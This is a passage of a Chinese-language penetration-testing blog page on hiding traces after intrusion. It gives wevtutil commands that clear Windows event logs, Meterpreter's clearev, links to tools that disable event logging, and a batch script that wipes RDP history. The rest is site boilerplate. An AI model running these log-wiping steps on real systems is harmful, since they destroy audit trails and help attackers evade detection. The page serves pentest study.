+<li>回應<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber:1</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>查看指定日誌的具體內容  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text <span class="string">&quot;windows powershell&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>刪除單一日誌的具體內容  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl <span class="string">&quot;windows powershell&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="破壞-Windows-日誌紀錄功能"><a href="#破壞-Windows-日誌紀錄功能" class="headerlink" title="破壞 Windows 日誌紀錄功能"></a><em>破壞 Windows 日誌紀錄功能</em></h3><ul>
+<li>利用工具<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Windows-EventLog-Bypass">Windows-EventLog-Bypass</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; run</span><br><span class="line">&gt; clearlogs</span><br><span class="line">&gt; clearev</span><br></pre></td></tr></table></figure>
+
+<h4 id="3389-登入紀錄清除"><a href="#3389-登入紀錄清除" class="headerlink" title="3389 登入紀錄清除"></a>3389 登入紀錄清除</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ <span class="built_in">echo</span> off</span><br><span class="line">@ reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> /va /f</span><br><span class="line">@ del %USERPROFILE%\My Documents\Default.rdp<span class="string">&quot; /a</span></span><br><span class="line"><span class="string">@ exit</span></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        Share
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://nightcatv.github.io/2021/09/22/%E3%80%90%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F%E3%80%91%E6%95%B4%E9%AB%94%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%B8%BD%E7%B5%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ad/" rel="tag">ad</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/attack/" rel="tag">attack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cyber-security/" rel="tag">cyber security</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/01/23/Buffer%20Overflow%20Lab/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Buffer Overflow Lab</div>
+      </a>
+    
+  </nav>
+
+  
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2019-2021
+        <i class="ri-heart-fill heart_icon"></i> NIghTcAt
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Night Vestige"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">首頁</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">文章</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分類</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">標籤</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">關於我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>請我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
